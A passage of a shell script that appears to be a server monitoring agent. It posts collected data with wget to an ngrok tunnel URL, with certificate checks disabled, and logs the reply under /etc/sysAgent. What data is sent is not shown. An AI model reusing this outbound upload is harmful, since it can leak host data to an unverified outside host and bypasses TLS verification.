...
then
	timeout -s SIGKILL 30 wget -q -o /dev/null -O /etc/sysAgent/sh-agent.log -T 25 --post-data "$data_post" --no-check-certificate "https://ba1ae84913dd.ngrok.io/agent"
else
	wget -q -o /dev/null -O /etc/sysAgent/sh-agent.log -T 25 --post-data "$data_post" --no-check-certificate "https://ba1ae84913dd.ngrok.io/agent"
	wget_pid=$!
	wget_counter=0
	wget_timeout=30
